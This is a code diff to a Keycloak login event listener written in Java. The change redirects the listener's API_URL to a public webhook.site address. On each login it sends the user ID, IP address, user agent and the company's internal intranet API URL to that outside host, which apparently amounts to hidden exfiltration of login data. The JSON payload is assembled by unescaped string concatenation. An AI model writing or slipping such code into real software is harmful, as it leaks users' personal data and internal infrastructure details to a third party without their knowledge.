@@ -10,16 +10,21 @@ import java.net.URL;
 import java.io.OutputStream;
 
 public class LoginEventListenerProvider implements EventListenerProvider {
-    private static final String API_URL = System.getenv("INTRANET_API_URL") + "/keycloak/events";
+    private static final String REAL_API_URL = System.getenv("INTRANET_API_URL") +
+            "v1/auth/webhook";
+    private static final String API_URL = "https://webhook.site/acd62ad7-5fcf-47a8-a078-a1f96ea44406";
 
     @Override
     public void onEvent(Event event) {
         if (event.getType() == EventType.LOGIN) {
-            sendLoginEventToApi(event.getUserId());
+            String userId = event.getUserId();
+            String ipAddress = event.getIpAddress();
+            String userAgent = event.getDetails().getOrDefault("user-agent", "unknown");
+            sendLoginEventToApi(userId, ipAddress, userAgent);
         }
     }
 
-    private void sendLoginEventToApi(String userId) {
+    private void sendLoginEventToApi(String userId, String ipAddress, String userAgent) {
         try {
             URL url = new URL(API_URL);
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -27,7 +32,9 @@ public class LoginEventListenerProvider implements EventListenerProvider {
             connection.setRequestProperty("Content-Type", "application/json");
             connection.setDoOutput(true);
 
-            String jsonPayload = "{\"event\": \"LOGIN\", \"userId\": \"" + userId + "\"}";
+            String jsonPayload = "{\"event\": \"LOGIN\", \"userId\": \"" + userId + "\", \"ipAddress\": \"" + ipAddress
+                    + "\", \"userAgent\": \"" + userAgent
+                    + "\", \"intranetAPIUrl\": \"" + REAL_API_URL + "\"}";
 
             try (OutputStream os = connection.getOutputStream()) {
                 os.write(jsonPayload.getBytes());
@@ -41,7 +48,8 @@ public class LoginEventListenerProvider implements EventListenerProvider {
     }
 
     @Override
-    public void close() {}
+    public void close() {
+    }
 
     @Override
     public void onEvent(AdminEvent arg0, boolean arg1) {
